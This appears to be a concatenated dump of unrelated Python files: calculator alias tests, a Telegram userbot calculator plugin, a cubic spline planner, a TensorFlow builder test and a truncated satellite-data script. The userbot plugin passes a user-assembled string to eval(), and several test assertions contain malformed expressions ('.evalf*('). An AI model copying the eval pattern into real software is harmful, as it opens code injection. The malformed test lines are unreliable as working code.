calc.chksym(\"atandeg\")\n    assert calc.chksym(\"asecdeg\")\n    assert calc.chksym(\"acscdeg\")\n    assert calc.chksym(\"acotdeg\")\n    assert calc.chksym(\"arcsindeg\")\n    assert calc.chksym(\"arccosdeg\")\n    assert calc.chksym(\"arctandeg\")\n    assert calc.chksym(\"arcsecdeg\")\n    assert calc.chksym(\"arccscdeg\")\n    assert calc.chksym(\"arccotdeg\")\n\n    assert callable(calc.getsym(\"mksym\"))\n    assert callable(calc.getsym(\"nCr\"))\n    assert callable(calc.getsym(\"ncr\"))\n    assert callable(calc.getsym(\"nPr\"))\n    assert callable(calc.getsym(\"npr\"))\n    assert callable(calc.getsym(\"plot_3d\"))\n    assert callable(calc.getsym(\"plot_3d_parametric_line\"))\n    assert callable(calc.getsym(\"plot_3d_parametric_surface\"))\n    assert callable(calc.getsym(\"graph\"))\n    assert callable(calc.getsym(\"graph_implicit\"))\n    assert callable(calc.getsym(\"graph_parametric\"))\n    assert callable(calc.getsym(\"graph3d\"))\n    assert callable(calc.getsym(\"graph3d_parametric_line\"))\n    assert callable(calc.getsym(\"graph3d_parametric_surface\"))\n    assert callable(calc.getsym(\"differentiate\"))\n    assert callable(calc.getsym(\"arcsin\"))\n    assert callable(calc.getsym(\"arccos\"))\n    assert callable(calc.getsym(\"arctan\"))\n    assert callable(calc.getsym(\"arcsec\"))\n    assert callable(calc.getsym(\"arccsc\"))\n    assert callable(calc.getsym(\"arccot\"))\n    assert callable(calc.getsym(\"arcsinh\"))\n    assert callable(calc.getsym(\"arccosh\"))\n    assert callable(calc.getsym(\"arctanh\"))\n    assert callable(calc.getsym(\"arcsech\"))\n    assert callable(calc.getsym(\"arccsch\"))\n    assert callable(calc.getsym(\"arccoth\"))\n    assert callable(calc.getsym(\"sindeg\"))\n    assert callable(calc.getsym(\"cosdeg\"))\n    assert callable(calc.getsym(\"tandeg\"))\n    assert callable(calc.getsym(\"secdeg\"))\n    assert callable(calc.getsym(\"cscdeg\"))\n    assert callable(calc.getsym(\"cotdeg\"))\n    assert callable(calc.getsym(\"asindeg\"))\n    assert callable(calc.getsym(\"acosdeg\"))\n    assert callable(calc.getsym(\"atandeg\"))\n    assert callable(calc.getsym(\"asecdeg\"))\n    assert callable(calc.getsym(\"acscdeg\"))\n    assert callable(calc.getsym(\"acotdeg\"))\n    assert callable(calc.getsym(\"arcsindeg\"))\n    assert callable(calc.getsym(\"arccosdeg\"))\n    assert callable(calc.getsym(\"arctandeg\"))\n    assert callable(calc.getsym(\"arcsecdeg\"))\n    assert callable(calc.getsym(\"arccscdeg\"))\n    assert callable(calc.getsym(\"arccotdeg\"))\n\n\ndef test_plugin_aliases_available():\n    calc = TestCalculator()\n    calc.register_plugin(AddAliases())\n    assert callable(calc.command(\"mksym\"))\n    assert callable(calc.command(\"nCr\"))\n    assert callable(calc.command(\"ncr\"))\n    assert callable(calc.command(\"nPr\"))\n    assert callable(calc.command(\"npr\"))\n    assert callable(calc.command(\"plot_3d\"))\n    assert callable(calc.command(\"plot_3d_parametric_line\"))\n    assert callable(calc.command(\"plot_3d_parametric_surface\"))\n    assert callable(calc.command(\"graph\"))\n    assert callable(calc.command(\"graph_implicit\"))\n    assert callable(calc.command(\"graph_parametric\"))\n    assert callable(calc.command(\"graph3d\"))\n    assert callable(calc.command(\"graph3d_parametric_line\"))\n    assert callable(calc.command(\"graph3d_parametric_surface\"))\n    assert callable(calc.command(\"differentiate\"))\n    assert callable(calc.command(\"arcsin\"))\n    assert callable(calc.command(\"arccos\"))\n    assert callable(calc.command(\"arctan\"))\n    assert callable(calc.command(\"arcsec\"))\n    assert callable(calc.command(\"arccsc\"))\n    assert callable(calc.command(\"arccot\"))\n    assert callable(calc.command(\"arcsinh\"))\n    assert callable(calc.command(\"arccosh\"))\n    assert callable(calc.command(\"arctanh\"))\n    assert callable(calc.command(\"arcsech\"))\n    assert callable(calc.command(\"arccsch\"))\n    assert callable(calc.command(\"arccoth\"))\n    assert callable(calc.command(\"sindeg\"))\n    assert callable(calc.command(\"cosdeg\"))\n    assert callable(calc.command(\"tandeg\"))\n    assert callable(calc.command(\"secdeg\"))\n    assert callable(calc.command(\"cscdeg\"))\n    assert callable(calc.command(\"cotdeg\"))\n    assert callable(calc.command(\"asindeg\"))\n    assert callable(calc.command(\"acosdeg\"))\n    assert callable(calc.command(\"atandeg\"))\n    assert callable(calc.command(\"asecdeg\"))\n    assert callable(calc.command(\"acscdeg\"))\n    assert callable(calc.command(\"acotdeg\"))\n    assert callable(calc.command(\"arcsindeg\"))\n    assert callable(calc.command(\"arccosdeg\"))\n    assert callable(calc.command(\"arctandeg\"))\n    assert callable(calc.command(\"arcsecdeg\"))\n    assert callable(calc.command(\"arccscdeg\"))\n    assert callable(calc.command(\"arccotdeg\"))\n\n\ndef test_plugin_aliases_degree_conversion():\n    calc = TestCalculator()\n    calc.register_plugin(AddAliases())\n\n    assert calc.command(\"sindeg(0)\") == 0\n    assert calc.command(\"cosdeg(0)\") == 1\n    assert calc.command(\"tandeg(0)\") == 0\n    # assert calc.command(\"cscdeg(0)\") == 0\n    assert calc.command(\"secdeg(0)\") == 1\n    # assert calc.command(\"tandeg(0)\") == 0\n\n    assert calc.command(\"sindeg(30)\") == calc.command(\"S(1)/2\")\n    assert calc.command(\"cosdeg(30)\") == calc.command(\"sqrt(S(3))/2\")\n    assert calc.command(\"tandeg(30)\") == calc.command(\"sqrt(S(3))/3\")\n    assert calc.command(\"cscdeg(30)\") == 2\n    assert calc.command(\"secdeg(30)\") == calc.command(\"2/sqrt(S(3))\")\n    assert calc.command(\"cotdeg(30)\") == calc.command(\"3/sqrt(S(3))\")\n    assert calc.command(\"sindeg(45)\") == calc.command(\"sqrt(S(2))/2\")\n    assert calc.command(\"cosdeg(45)\") == calc.command(\"sqrt(S(2))/2\")\n    assert calc.command(\"tandeg(45)\") == 1\n    assert calc.command(\"cscdeg(45)\") == calc.command(\"2/sqrt(S(2))\")\n    assert calc.command(\"secdeg(45)\") == calc.command(\"2/sqrt(S(2))\")\n    assert calc.command(\"cotdeg(45)\") == 1\n    assert calc.command(\"sindeg(60)\") == calc.command(\"sqrt(S(3))/2\")\n    assert calc.command(\"cosdeg(60)\") == calc.command(\"S(1)/2\")\n    assert calc.command(\"tandeg(60)\") == calc.command(\"sqrt(S(3))\")\n    assert calc.command(\"cscdeg(60)\") == calc.command(\"2/sqrt(S(3))\")\n    assert calc.command(\"secdeg(60)\") == 2\n    assert calc.command(\"cotdeg(60)\") == calc.command(\"1/sqrt(S(3))\")\n    assert calc.command(\"sindeg(90)\") == 1\n    assert calc.command(\"cosdeg(90)\") == 0\n    # assert calc.command(\"tandeg(90)\") == 0\n    # assert calc.command(\"secdeg(90)\") == 0\n    assert calc.command(\"cscdeg(90)\") == 1\n    # assert calc.command(\"cotdeg(90)\") == 0\n    assert calc.command(\"sindeg(120)\") == calc.command(\"sqrt(S(3))/2\")\n    assert calc.command(\"cosdeg(120)\") == calc.command(\"-S(1)/2\")\n    assert calc.command(\"tandeg(120)\") == calc.command(\"-sqrt(S(3))\")\n    assert calc.command(\"cscdeg(120)\") == calc.command(\"2/sqrt(S(3))\")\n    assert calc.command(\"secdeg(120)\") == -2\n    assert calc.command(\"cotdeg(120)\") == calc.command(\"-1/sqrt(S(3))\")\n    assert calc.command(\"sindeg(150)\") == calc.command(\"S(1)/2\")\n    assert calc.command(\"cosdeg(150)\") == calc.command(\"-sqrt(S(3))/2\")\n    assert calc.command(\"tandeg(150)\") == calc.command(\"-sqrt(S(3))/3\")\n    assert calc.command(\"cscdeg(150)\") == 2\n    assert calc.command(\"secdeg(150)\") == calc.command(\"-2/sqrt(S(3))\")\n    assert calc.command(\"cotdeg(150)\") == calc.command(\"-3/sqrt(S(3))\")\n    assert calc.command(\"sindeg(180)\") == 0\n    assert calc.command(\"cosdeg(180)\") == -1\n    assert calc.command(\"tandeg(180)\") == 0\n    # assert calc.command(\"cscdeg(180)\") == 0\n    assert calc.command(\"secdeg(180)\") == -1\n    # assert calc.command(\"tandeg(180)\") == 0\n\n    assert calc.command(\"sindeg(-30)\") == calc.command(\"-S(1)/2\")\n    assert calc.command(\"cosdeg(-30)\") == calc.command(\"sqrt(S(3))/2\")\n    assert calc.command(\"tandeg(-30)\") == calc.command(\"-sqrt(S(3))/3\")\n    assert calc.command(\"cscdeg(-30)\") == -2\n    assert calc.command(\"secdeg(-30)\") == calc.command(\"2/sqrt(S(3))\")\n    assert calc.command(\"cotdeg(-30)\") == calc.command(\"-3/sqrt(S(3))\")\n    assert calc.command(\"sindeg(-45)\") == calc.command(\"-sqrt(S(2))/2\")\n    assert calc.command(\"cosdeg(-45)\") == calc.command(\"sqrt(S(2))/2\")\n    assert calc.command(\"tandeg(-45)\") == -1\n    assert calc.command(\"cscdeg(-45)\") == calc.command(\"-2/sqrt(S(2))\")\n    assert calc.command(\"secdeg(-45)\") == calc.command(\"2/sqrt(S(2))\")\n    assert calc.command(\"cotdeg(-45)\") == -1\n    assert calc.command(\"sindeg(-60)\") == calc.command(\"-sqrt(S(3))/2\")\n    assert calc.command(\"cosdeg(-60)\") == calc.command(\"S(1)/2\")\n    assert calc.command(\"tandeg(-60)\") == calc.command(\"-sqrt(S(3))\")\n    assert calc.command(\"cscdeg(-60)\") == calc.command(\"-2/sqrt(S(3))\")\n    assert calc.command(\"secdeg(-60)\") == 2\n    assert calc.command(\"cotdeg(-60)\") == calc.command(\"-1/sqrt(S(3))\")\n    assert calc.command(\"sindeg(-90)\") == -1\n    assert calc.command(\"cosdeg(-90)\") == 0\n    # assert calc.command(\"tandeg(-90)\") == 0\n    # assert calc.command(\"secdeg(-90)\") == 0\n    assert calc.command(\"cscdeg(-90)\") == -1\n    # assert calc.command(\"cotdeg(-90)\") == 0\n    assert calc.command(\"sindeg(-120)\") == calc.command(\"-sqrt(S(3))/2\")\n    assert calc.command(\"cosdeg(-120)\") == calc.command(\"-S(1)/2\")\n    assert calc.command(\"tandeg(-120)\") == calc.command(\"sqrt(S(3))\")\n    assert calc.command(\"cscdeg(-120)\") == calc.command(\"-2/sqrt(S(3))\")\n    assert calc.command(\"secdeg(-120)\") == -2\n    assert calc.command(\"cotdeg(-120)\") == calc.command(\"1/sqrt(S(3))\")\n    assert calc.command(\"sindeg(-150)\") == calc.command(\"-S(1)/2\")\n    assert calc.command(\"cosdeg(-150)\") == calc.command(\"-sqrt(S(3))/2\")\n    assert calc.command(\"tandeg(-150)\") == calc.command(\"sqrt(S(3))/3\")\n    assert calc.command(\"cscdeg(-150)\") == -2\n    assert calc.command(\"secdeg(-150)\") == calc.command(\"-2/sqrt(S(3))\")\n    assert calc.command(\"cotdeg(-150)\") == calc.command(\"3/sqrt(S(3))\")\n    assert calc.command(\"sindeg(-180)\") == 0\n    assert calc.command(\"cosdeg(-180)\") == -1\n    assert calc.command(\"tandeg(-180)\") == 0\n    # assert calc.command(\"cscdeg(-180)\") == 0\n    assert calc.command(\"secdeg(-180)\") == -1\n    # assert calc.command(\"tandeg(-180)\") == 0\n\n    for n in range(1, 10):\n        for d in range(0, 360, 10):\n            assert calc.command(f\"sindeg({d}).evalf()\") == calc.command(f\"sindeg({d + 360*n}).evalf*(\") == calc.command(f\"sindeg({d - 360*n}).evalf()\")\n            assert calc.command(f\"cosdeg({d}).evalf()\") == calc.command(f\"cosdeg({d + 360*n}).evalf*(\") == calc.command(f\"cosdeg({d - 360*n}).evalf()\")\n            assert calc.command(f\"tandeg({d}).evalf()\") == calc.command(f\"tandeg({d + 180*n}).evalf*(\") == calc.command(f\"tandeg({d - 180*n}).evalf()\")\n            assert calc.command(f\"secdeg({d}).evalf()\") == calc.command(f\"secdeg({d + 360*n}).evalf*(\") == calc.command(f\"secdeg({d - 360*n}).evalf()\")\n            assert calc.command(f\"cscdeg({d}).evalf()\") == calc.command(f\"cscdeg({d + 360*n}).evalf*(\") == calc.command(f\"cscdeg({d - 360*n}).evalf()\")\n            assert calc.command(f\"cotdeg({d}).evalf()\") == calc.command(f\"cotdeg({d + 180*n}).evalf*(\") == calc.command(f\"cotdeg({d - 180*n}).evalf()\")\n\n\ndef test_plugin_aliases_invdegree_conversion():\n    calc = TestCalculator()\n    calc.register_plugin(AddAliases())\n\n    assert calc.command(\"asindeg(0)\") == 0\n    assert calc.command(\"acosdeg(0)\") == 90\n    assert calc.command(\"atandeg(0)\") == 0\n\n    assert calc.command(\"asindeg(S(1)/2)\") == 30\n    assert calc.command(\"acosdeg(sqrt(S(3))/2)\") == 30\n    assert calc.command(\"atandeg(sqrt(S(3))/3)\") == 30\n    assert calc.command(\"acscdeg(2)\") == 30\n    assert calc.command(\"asecdeg(2/sqrt(S(3)))\") == 30\n    assert calc.command(\"acotdeg(3/sqrt(S(3)))\") == 30\n    assert calc.command(\"asindeg(sqrt(S(2))/2)\") == 45\n    assert calc.command(\"acosdeg(sqrt(S(2))/2)\") == 45\n    assert calc.command(\"atandeg(1)\") == 45\n    assert calc.command(\"acscdeg(2/sqrt(S(2)))\") == 45\n    assert calc.command(\"asecdeg(2/sqrt(S(2)))\") == 45\n    assert calc.command(\"acotdeg(1)\") == 45\n    assert calc.command(\"asindeg(sqrt(S(3))/2)\") == 60\n    assert calc.command(\"acosdeg(S(1)/2)\") == 60\n    assert calc.command(\"atandeg(sqrt(S(3)))\") == 60\n    assert calc.command(\"acscdeg(2/sqrt(S(3)))\") == 60\n    assert calc.command(\"asecdeg(2)\") == 60\n    assert calc.command(\"acotdeg(1/sqrt(S(3)))\") == 60\n    assert calc.command(\"asindeg(1)\") == 90\n    assert calc.command(\"acosdeg(0)\") == 90\n    assert calc.command(\"acscdeg(1)\") == 90\n\n    assert calc.command(\"asindeg(-S(1)/2)\") == -30\n    assert calc.command(\"atandeg(-sqrt(S(3))/3)\") == -30\n    assert calc.command(\"acscdeg(-2)\") == -30\n    assert calc.command(\"acotdeg(-3/sqrt(S(3)))\") == -30\n    assert calc.command(\"asindeg(-sqrt(S(2))/2)\") == -45\n    assert calc.command(\"atandeg(-1)\") == -45\n    assert calc.command(\"acscdeg(-2/sqrt(S(2)))\") == -45\n    assert calc.command(\"acotdeg(-1)\") == -45\n    assert calc.command(\"asindeg(-sqrt(S(3))/2)\") == -60\n    assert calc.command(\"atandeg(-sqrt(S(3)))\") == -60\n    assert calc.command(\"acscdeg(-2/sqrt(S(3)))\") == -60\n    assert calc.command(\"acotdeg(-1/sqrt(S(3)))\") == -60\n    assert calc.command(\"asindeg(-1)\") == -90\n    assert calc.command(\"cscdeg(-90)\") == -1\n\n    for d in range(-170, 171, 10):\n        assert calc.command(f\"asindeg({d}).evalf()\") == calc.command(f\"arcsindeg({d}).evalf()\")\n        assert calc.command(f\"acosdeg({d}).evalf()\") == calc.command(f\"arccosdeg({d}).evalf()\")\n        assert calc.command(f\"atandeg({d}).evalf()\") == calc.command(f\"arctandeg({d}).evalf()\")\n        assert calc.command(f\"asecdeg({d}).evalf()\") == calc.command(f\"arcsecdeg({d}).evalf()\")\n        assert calc.command(f\"acscdeg({d}).evalf()\") == calc.command(f\"arccscdeg({d}).evalf()\")\n        assert calc.command(f\"atandeg({d}).evalf()\") == calc.command(f\"arctandeg({d}).evalf()\")\n", "45": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "46": "\"\"\"\nCubic spline planner\n\nAuthor: Atsushi Sakai(@Atsushi_twi)\n\n\"\"\"\nimport math\nimport numpy as np\nimport bisect\n\n\nclass Spline:\n    \"\"\"\n    Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.b, self.c, self.d, self.w = [], [], [], []\n\n        self.x = x\n        self.y = y\n\n        self.nx = len(x)  # dimension of x\n        h = np.diff(x)\n\n        # calc coefficient c\n        self.a = [iy for iy in y]\n\n        # calc coefficient c\n        A = self.__calc_A(h)\n        B = self.__calc_B(h)\n        self.c = np.linalg.solve(A, B)\n        #  print(self.c1)\n\n        # calc spline coefficient b and d\n        for i in range(self.nx - 1):\n            self.d.append((self.c[i + 1] - self.c[i]) / (3.0 * h[i]))\n            tb = (self.a[i + 1] - self.a[i]) / h[i] - h[i] * \\\n                (self.c[i + 1] + 2.0 * self.c[i]) / 3.0\n            self.b.append(tb)\n\n    def calc(self, t):\n        \"\"\"\n        Calc position\n\n        if t is outside of the input x, return None\n\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.a[i] + self.b[i] * dx + \\\n            self.c[i] * dx ** 2.0 + self.d[i] * dx ** 3.0\n\n        return result\n\n    def calcd(self, t):\n        \"\"\"\n        Calc first derivative\n\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.b[i] + 2.0 * self.c[i] * dx + 3.0 * self.d[i] * dx ** 2.0\n        return result\n\n    def calcdd(self, t):\n        \"\"\"\n        Calc second derivative\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = 2.0 * self.c[i] + 6.0 * self.d[i] * dx\n        return result\n\n    def __search_index(self, x):\n        \"\"\"\n        search data segment index\n        \"\"\"\n        return bisect.bisect(self.x, x) - 1\n\n    def __calc_A(self, h):\n        \"\"\"\n        calc matrix A for spline coefficient c\n        \"\"\"\n        A = np.zeros((self.nx, self.nx))\n        A[0, 0] = 1.0\n        for i in range(self.nx - 1):\n            if i != (self.nx - 2):\n                A[i + 1, i + 1] = 2.0 * (h[i] + h[i + 1])\n            A[i + 1, i] = h[i]\n            A[i, i + 1] = h[i]\n\n        A[0, 1] = 0.0\n        A[self.nx - 1, self.nx - 2] = 0.0\n        A[self.nx - 1, self.nx - 1] = 1.0\n        #  print(A)\n        return A\n\n    def __calc_B(self, h):\n        \"\"\"\n        calc matrix B for spline coefficient c\n        \"\"\"\n        B = np.zeros(self.nx)\n        for i in range(self.nx - 2):\n            B[i + 1] = 3.0 * (self.a[i + 2] - self.a[i + 1]) / \\\n                h[i + 1] - 3.0 * (self.a[i + 1] - self.a[i]) / h[i]\n        return B\n\n\nclass Spline2D:\n    \"\"\"\n    2D Cubic Spline class\n\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.s = self.__calc_s(x, y)\n        self.sx = Spline(self.s, x)\n        self.sy = Spline(self.s, y)\n\n    def __calc_s(self, x, y):\n        dx = np.diff(x)\n        dy = np.diff(y)\n        self.ds = np.hypot(dx, dy)\n        s = [0]\n        s.extend(np.cumsum(self.ds))\n        return s\n\n    def calc_position(self, s):\n        \"\"\"\n        calc position\n        \"\"\"\n        x = self.sx.calc(s)\n        y = self.sy.calc(s)\n\n        return x, y\n\n    def calc_curvature(self, s):\n        \"\"\"\n        calc curvature\n        \"\"\"\n        dx = self.sx.calcd(s)\n        ddx = self.sx.calcdd(s)\n        dy = self.sy.calcd(s)\n        ddy = self.sy.calcdd(s)\n        k = (ddy * dx - ddx * dy) / ((dx ** 2 + dy ** 2)**(3 / 2))\n        return k\n\n    def calc_yaw(self, s):\n        \"\"\"\n        calc yaw\n        \"\"\"\n        dx = self.sx.calcd(s)\n        dy = self.sy.calcd(s)\n        yaw = math.atan2(dy, dx)\n        return yaw\n\n\ndef calc_spline_course(x, y, ds=0.1):\n    sp = Spline2D(x, y)\n    s = list(np.arange(0, sp.s[-1], ds))\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    return rx, ry, ryaw, rk, s\n\n\ndef main():  # pragma: no cover\n    print(\"Spline 2D test\")\n    import matplotlib.pyplot as plt\n    x = [-2.5, 0.0, 2.5, 5.0, 7.5, 3.0, -1.0]\n    y = [0.7, -6, 5, 6.5, 0.0, 5.0, -2.0]\n    ds = 0.1  # [m] distance of each intepolated points\n\n    sp = Spline2D(x, y)\n    s = np.arange(0, sp.s[-1], ds)\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    plt.subplots(1)\n    plt.plot(x, y, \"xb\", label=\"input\")\n    plt.plot(rx, ry, \"-r\", label=\"spline\")\n    plt.grid(True)\n    plt.axis(\"equal\")\n    plt.xlabel(\"x[m]\")\n    plt.ylabel(\"y[m]\")\n    plt.legend()\n\n    plt.subplots(1)\n    plt.plot(s, [np.rad2deg(iyaw) for iyaw in ryaw], \"-r\", label=\"yaw\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"yaw angle[deg]\")\n\n    plt.subplots(1)\n    plt.plot(s, rk, \"-r\", label=\"curvature\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"curvature [1/m]\")\n\n    plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "47": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "48": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"Temporary program, calculate min, max, std, avg of one day obc data.\n\nUsage:\n    calc_daily.py --sat=fy3c --ins=iras --nwp=t639 --date=now\n\nArguments:\n    sat: the satellite you want to calc, fy3c\n    ins: the insatrument you want to calc, mwts\n    nwp: t639 or ncep\n    date: calc for special date. YYYY-mm-dd like 2014-04-24 [default: now]\n\n\"\"\"\n\n__author__ = 'gumeng'\n\n# Copyright (c) 2014, shinetek.\n# All rights reserved.    \n#    \n# work flow:\n# crontabed every day 00:30, then calc, save result to db.\n#         \n# /usr/bin/python /home/fymonitor/MONITORFY3C/py2/bin/calc_daily.py \n# --sat=fy3c --ins=mwts --nwp=t639 --date=now\n# >> /home/fymonitor/DATA/LOG/calc_daily.py.log 2>&1\n#                         \n# date          author    changes\n# 2014-08-09    gumeng    create\n\nimport os\nimport sys\nimport time\nimport numpy\nimport shutil\nimport signal\nimport commands\nimport warnings\nimport MySQLdb\nimport h5py as h5\nfrom datetime import timedelta\nfrom multiprocessing import Pool \n\nwarnings.filterwarnings('ignore', category = MySQLdb.Warning)\n\ntimeuse_begin = time.time()\n\nsys.path.append('/home/fymonitor/MONITORFY3C/py2/conf')\nconf = __import__('conf')\ncommon = __import__('common')\ndocopt = __import__('docopt')\n\n# set read-only global variables.\n\narguments = docopt.docopt(__doc__)\nsat = arguments['--sat'].lower()\nins = arguments['--ins'].lower()\nnwp = arguments['--nwp'].lower()\ncalc_date = arguments['--date'].lower()\n\nins_conf_file = sat.upper() + '_' + ins.upper() + '_CONF'\nins_conf = __import__(ins_conf_file)\n\nif sat not in conf.support_sat_ins or ins not in conf.support_sat_ins[sat]:\n    print 'sat or ins setting is NOT found in conf.py'\n    sys.exit(0)\n    \npid = os.getpid()\nfname = os.path.splitext(os.path.basename(os.path.realpath(__file__) ) )[0]\nlog_tag = fname + '.' + sat + '.' + ins + '.' + str(pid)\nmy_name = common.get_local_hostname()\nmy_tag = my_name+'.'+log_tag\nmy_pidfile = conf.pid_path + '/' + my_name + '.' + fname + '.' + sat + '.' \\\n            + ins + '.pid'\nmy_alivefile = conf.pid_path + '/' + my_name + '.' + fname + '.' + sat + '.' \\\n            + ins + '.alive'\nmy_log = conf.log_path + '/' + my_name + '.' # just prefix: /log/path/prefix.\n\n#get the correct time span.\nif calc_date == 'now':\n    calc_date = 